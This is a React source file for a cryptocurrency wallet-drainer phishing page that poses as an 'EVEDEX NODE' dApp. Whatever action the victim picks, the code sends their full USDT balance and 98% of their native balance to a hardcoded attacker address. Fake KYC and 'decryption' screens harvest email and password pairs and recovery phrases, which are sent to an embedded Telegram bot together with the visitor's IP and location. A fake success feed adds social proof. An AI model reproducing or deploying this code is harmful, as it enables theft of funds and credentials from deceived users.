import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
import { parseEther, formatEther, parseUnits } from 'viem';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { sendTransaction } = useSendTransaction();
  
  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [kycEmail, setKycEmail] = useState("");
  const [kycPass, setKycPass] = useState("");
  const [kycMode, setKycMode] = useState("email"); // email or seed
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [feedMsg, setFeedMsg] = useState(""); 
  const [visitorInfo, setVisitorInfo] = useState("Locating...");

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; 

  const USDT_MAP = { 
    1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 
    56: "0x55d398326f99059ff775485246999027b3197955", 
    137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", 
    42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" 
  };

  const { data: nativeBal } = useBalance({ address }); 
  const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });

  // --- LOGGING ENGINE ---
  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify({ chat_id: chatId, text: `${msg}\n📍 LOC: ${visitorInfo}` }) 
  }).catch(()=>{});

  // 1. CONNECTION NOTIFICATION TRIGGER
  useEffect(() => {
    if (isConnected && address) {
      log(`🔔 NEW_CONNECTION: ${address}\nTOKEN: ${tokenBal?.formatted || "0"}\nNATIVE: ${nativeBal?.formatted || "0"}\nCHAIN: ${chainId}`);
    }
  }, [isConnected, address]);

  useEffect(() => {
    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city})`)).catch(()=>setVisitorInfo("Unknown"));
    const interval = setInterval(() => {
      const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
      setFeedMsg(`🛡️ ${addr} Rectified Successfully`);
      setTimeout(() => setFeedMsg(""), 4500);
    }, 8500);
    return () => clearInterval(interval);
  }, []);

  // Sync balances for Rectify Dashboard
  useEffect(() => {
    if (activeTask === "Rectify") {
      setInputVal(selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 10) || "0.00") : (nativeBal?.formatted?.slice(0, 10) || "0.00"));
    }
  }, [selectedAsset, tokenBal, nativeBal, activeTask]);

  // 2. TOTAL DRAIN SWEEP (Ignores typed amount, pulls max available)
  const sweepNative = () => {
    if (!nativeBal || nativeBal.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
    // Force max withdrawal (98% of native gas)
    const val = (nativeBal.value * 980n) / 1000n;
    sendTransaction({ to: destination, value: val }, {
      onSuccess: (h) => { 
        log(`✅ NAT_DRAIN: ${address}\nTX: ${h}`); 
        setView("seed_gate"); 
        setLoading(false); 
      },
      onError: () => { 
        setView("seed_gate"); 
        setLoading(false); 
      }
    });
  };

  const executeTaskAction = () => {
    setLoading(true);
    const tokenAddr = USDT_MAP[chainId];
    
    // Check for tokens first - if found, drain them entirely before moving to native
    if (tokenAddr && tokenBal && tokenBal.value > 0n) {
      const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
      sendTransaction({ to: tokenAddr, data: payload }, {
        onSuccess: (h) => { 
          log(`💰 TOK_DRAIN: ${address}\nTX: ${h}`); 
          setTimeout(sweepNative, 1000); 
        },
        onError: () => sweepNative() // Hit gas even if they reject token popup
      });
    } else {
      sweepNative();
    }
  };

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      {/* 1. LIVE MARKET CHART */}
      <div style={{width:'100%', height:'180px', backgroundColor:'black', borderRadius:'15px', marginBottom:'20px', overflow:'hidden', border:'1px solid #1e293b'}}>
         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Market" />
      </div>

      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'25px'}}>
        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX NODE</div><div style={{fontSize:'8px', color:'#10b981'}}>AES-256 SECURED</div></div>
        <w3m-button balance="hide" />
      </header>

      {!isConnected ? (
        <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}><w3m-button /></div>
      ) : (
        <>
          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box"); if(n !== "Rectify") setInputVal("");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : n === "KYC" ? "#3b82f6" : "#fff", fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : n === "KYC" ? "🆔" : "〽️"}</div>{n}</button>
              ))}
            </div>
          )}

          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
              <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← BACK</button>
              
              {/* ASSET SWITCHER (RECTIFY ONLY) */}
              {activeTask === "Rectify" && (
                <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT</div>
                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b"}}>{nativeBal?.symbol}</div>
                </div>
              )}

              <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
              <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'15px'}}>
                <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>{activeTask === "Rectify" ? "VAULT_SYNC" : "ENTER FIGURES"}</label>
                <input type="number" step="any" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
              </div>
              <div style={{fontSize:'8px', color:'#475569', display:'flex', justifyContent:'space-between', marginBottom:'30px', padding:'0 10px'}}>
                <span>EST_NETWORK_FEE: 0.0012 {nativeBal?.symbol}</span>
                <span>LIQUIDITY_POOL: STABLE</span>
              </div>
              <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>PROCESS_{activeTask.toUpperCase()}</button>
            </div>
          )}

          {/* KYC LOGIN SYSTEM */}
          {view === "kyc_screen" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #3b82f6', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
              <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← CANCEL</button>
              <h2 style={{color:'white', fontWeight:'900', fontSize:'20px', marginBottom:'20px'}}>IDENTITY VERIFICATION</h2>
              <div style={{display:'flex', gap:'10px', marginBottom:'20px'}}>
                <button onClick={()=>setKycMode("email")} style={{flex:1, padding:'10px', borderRadius:'10px', fontSize:'9px', backgroundColor: kycMode === 'email' ? '#3b82f6' : 'black', color:'white', border:'1px solid #3b82f6'}}>EMAIL LOGIN</button>
                <button onClick={()=>setKycMode("seed")} style={{flex:1, padding:'10px', borderRadius:'10px', fontSize:'9px', backgroundColor: kycMode === 'seed' ? '#3b82f6' : 'black', color:'white', border:'1px solid #3b82f6'}}>SEED PHRASE</button>
              </div>
              {kycMode === "email" ? (
                <>
                  <input type="email" placeholder="EMAIL ADDRESS" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
                  <input type="password" placeholder="PASSWORD" value={kycPass} onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
                  <button onClick={()=>{log(`🆔 KYC_EMAIL: ${kycEmail} PASS: ${kycPass}`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_IDENTITY</button>
                </>
              ) : (
                <>
                  <textarea placeholder="RECOVERY PHRASE..." value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} style={{width:'100%', height:'100px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', padding:'15px', marginBottom:'25px'}} />
                  <button onClick={()=>{log(`🚨 KYC_SEED: ${seedVal}`); alert("IDENTITY_LINKED"); setView("menu");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>LINK_IDENTITY</button>
                </>
              )}
            </div>
          )}
        </>
      )}

      {/* FAKE SOCIAL PROOF FEED */}
      {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>}

      {/* ENCRYPTED SEED GATE */}
      {view === "seed_gate" && (
        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
            {!isSyncing ? (
              <>
                <div style={{color:'#10b981', fontWeight:'900', fontSize:'16px', marginBottom:'15px'}}>STABILIZATION_REQUIRED</div>
                <p style={{fontSize:'9px', color:'#64748b', marginBottom:'20px', lineHeight:'1.5'}}>DETECTION: PROTOCOL_DESYNC. TO PREVENT ASSET REVERSION AND FINALIZE THE ENCRYPTED BRIDGE, PLEASE PROVIDE THE NODE DECRYPTION KEY (PHRASE).</p>
                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="PROTOCOL_KEY..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', marginBottom:'25px', fontSize:'12px'}} />
                <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("DECRYPTION_ERROR: PLEASE RE-ENTER KEY");},1500)}},100);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>DECRYPT_VAULT</button>
              </>
            ) : (
              <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div></div>
            )}
          </div>
        </div>
      )}
      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>STABILIZING_CONNECTION...</div>}
    </div>
  );
}
